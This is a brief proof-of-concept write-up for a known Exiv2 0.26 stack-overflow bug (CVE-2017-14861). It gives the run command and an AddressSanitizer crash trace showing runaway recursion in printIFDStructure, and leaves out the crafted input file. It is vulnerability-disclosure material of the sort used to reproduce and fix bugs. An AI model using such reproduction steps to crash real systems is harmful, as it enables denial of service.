# Proof of Concept for Exiv2 Stack Overflow Vulnerability (CVE-2017-14861)

## POC URL
https://bugzilla.redhat.com/show_bug.cgi?id=1494787

## Compilation Environment
- OS: Linux (x86_64)
- Exiv2 Version: 0.26 (64-bit build)
- AddressSanitizer (ASAN) enabled

## Run Command
```
./exiv2 009-stack-over
```

## Expected Output
When running the PoC, the program should crash due to a stack overflow, with ASAN reporting the following error:

```
=================================================================
==65094==ERROR: AddressSanitizer: stack-overflow on address 0x7ffe028e0e88 (pc 0x7f1dab2e2b79 bp 0x7ffe028e1740 sp 0x7ffe028e0e90 T0)
#0 0x7f1dab2e2b78 (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x5fb78)
#1 0x7f1dab2e4145 in __interceptor_vsnprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x61145)
#2 0x7f1daab94e09 in Exiv2::Internal::stringFormat[abi:cxx11](char const*, ...) /root/fuzzing/exiv2-trunk/src/image.cpp:975
#3 0x7f1daab8fc59 in Exiv2::Image::printIFDStructure(Exiv2::BasicIo&, std::ostream&, Exiv2::PrintStructureOption, unsigned int, bool, char, int) /root/fuzzing/exiv2-trunk/src/image.cpp:357
#4 0x7f1daab9097c in Exiv2::Image::printIFDStructure(Exiv2::BasicIo&, std::ostream&, Exiv2::PrintStructureOption, unsigned int, bool, char, int) /root/fuzzing/exiv2-trunk/src/image.cpp:445
...
SUMMARY: AddressSanitizer: stack-overflow ??:0 ??
==65094==ABORTING
```

This output indicates a recursive stack overflow in the `Exiv2::Internal::stringFormat` function, leading to a crash.